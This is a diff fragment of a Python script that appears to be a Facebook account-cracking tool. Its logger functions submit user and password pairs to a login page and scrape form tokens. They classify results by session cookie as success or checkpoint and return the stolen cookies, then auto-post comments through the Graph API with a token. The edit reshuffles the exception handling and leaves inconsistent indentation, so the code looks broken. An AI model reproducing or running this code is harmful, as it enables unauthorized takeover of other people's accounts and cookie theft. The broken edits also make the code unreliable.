@@ -1275,8 +1275,7 @@ def logger1(user,pasw):
                 try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
-  except Exception as e:pass
-  else:
+       try:
             req  = xyz.get(f'https://{url_login}')
             log = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"uid":user,"pass":pasw,"flow":"login_no_pin"}
             head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
@@ -1284,7 +1283,7 @@ def logger1(user,pasw):
             if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
             elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
             else: return {"status":"error","email":user,"pass":pasw}
-  except Exception as e:pass
+       except Exception as e:pass
 
 def logger2(user,pasw):
   try:
@@ -1297,8 +1296,7 @@ def logger2(user,pasw):
                 try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
-  except Exception as e:pass
-  else:
+  try:
             req  = xyz.get(f'https://{url_login}')
             log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
             head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
@@ -1306,7 +1304,6 @@ def logger2(user,pasw):
             if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
             elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
             else: return {"status":"error","email":user,"pass":pasw}
-  except Exception as e:pass
 
 def logger3(user,pasw):
   try:
@@ -1319,8 +1316,7 @@ def logger3(user,pasw):
                 try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
-  except Exception as e:pass
-  else:
+  try:
             req  = xyz.get(f'https://{url_login}')
             log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
             head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
@@ -1328,7 +1324,6 @@ def logger3(user,pasw):
             if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
             elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
             else: return {"status":"error","email":user,"pass":pasw}
-  except Exception as e:pass
 
 ###----------[ CONVERT COOKIES ]---------- ###
 def cvt3(denventa):
